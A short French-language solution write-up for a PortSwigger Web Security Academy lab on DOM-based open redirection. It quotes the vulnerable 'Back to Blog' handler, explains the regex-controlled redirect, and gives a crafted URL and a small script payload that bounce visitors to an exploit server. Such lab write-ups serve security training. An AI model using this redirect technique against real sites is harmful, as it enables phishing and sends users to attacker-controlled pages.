# Lab

https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection

## Solution

Sur la page d'un article, on voit le bouton `Back to Blog` :

```html
<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
```

La variable `returnUrl` est le resutlat du match de la regex `/url=(https?:\/\/.+)/` sur l'URL de la page. Si la regex match, on est redirigé vers l'URL capturée, sinon on est redirigé vers la racine du site.

On peut ajouter un query parameter `url` à l'URL de la page pour être redirigé vers une URL arbitraire.

`https://ac3f1f3a1f0b0b1c80a3f3d400d900d7.web-security-academy.net/post?postId=1&url=https://google.com`

On est redirigé vers `https://google.com` si on clique sur le bouton `Back to Blog`.

On a plus qu'à faire un exploit de redirection vers cette page :

```html
<script>
    location.href = "https://ac3f1f3a1f0b0b1c80a3f3d400d900d7.web-security-academy.net/post?postId=1&url=https://exploit-0ab2004904597872809d8f1c012a00c4.exploit-server.net/"
</script>
```